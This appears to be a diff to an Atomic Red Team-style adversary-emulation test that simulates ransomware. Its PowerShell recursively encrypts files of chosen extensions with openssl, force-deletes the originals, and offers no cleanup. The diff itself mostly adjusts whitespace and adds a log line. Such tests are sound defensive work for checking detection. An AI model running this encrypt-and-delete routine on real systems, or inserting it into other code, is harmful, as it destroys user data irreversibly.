@@ -90,19 +90,20 @@ atomic_tests:
         $password = "#{encryption_password}"
         $targetDir = "#{target_directory}"
         $extensions = #{target_extensions}
-
+    
         # Initialize counters and logs
         $encryptedFiles = @()
         $nonEncryptedFiles = @()
-
+    
         if (-Not (Test-Path $targetDir)) {
             Write-Host "❌ The target directory $targetDir does not exist."
             exit 1
         }
-
+    
         Write-Host "✅ Starting encryption process..."
-
+    
         foreach ($ext in $extensions) {
+            Write-Host "🔍 Searching for files with extension: $ext"
             Get-ChildItem -Path $targetDir -Recurse -Filter "*$ext" -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -ne ".enc" } | ForEach-Object {
                 $file = $_.FullName
                 Write-Host "🔍 Processing file: $file"
@@ -114,11 +115,11 @@ atomic_tests:
                     $nonEncryptedFiles += @{ Name = $_.Name; Location = $_.DirectoryName }
                     return
                 }
-
+    
                 $encryptedFile = "$file.enc"
                 Write-Host "🔒 Encrypting file: $file -> $encryptedFile"
                 openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in $file -out $encryptedFile -pass pass:$password
-
+    
                 if ($LASTEXITCODE -eq 0) {
                     Remove-Item -Path $file -Force
                     Write-Host "🗑️ Deleted original file: $file"
@@ -129,10 +130,10 @@ atomic_tests:
                 }
             }
         }
-
+    
         # Generate Report
         Write-Host "`n=== Final Report ==="
-
+    
         # Encrypted Files
         Write-Host "✅ Number of encrypted files: $($encryptedFiles.Count)"
         if ($encryptedFiles.Count -gt 0) {
@@ -141,7 +142,7 @@ atomic_tests:
                 Write-Host "- Name: $($_.Name), Original Location: $($_.Location), Encrypted Location: $($_.EncryptedLocation)"
             }
         }
-
+    
         # Non-Encrypted Files
         Write-Host "❌ Number of non-encrypted files: $($nonEncryptedFiles.Count)"
         if ($nonEncryptedFiles.Count -gt 0) {
@@ -150,13 +151,13 @@ atomic_tests:
                 Write-Host "- Name: $($_.Name), Location: $($_.Location)"
             }
         }
-
+    
         # Log Encryption Details
         Write-Host "`n=== Encryption Details ==="
         Write-Host "Target Directory: $targetDir"
         Write-Host "Encryption Password: $password"
         Write-Host "Target Extensions: $($extensions -join ', ')"
-
+    
         Write-Host "✅ Encryption and deletion process completed!"
       cleanup_command: |
         Write-Host "No cleanup performed for destructive actions. To recover encrypted files, use the decryption password provided."
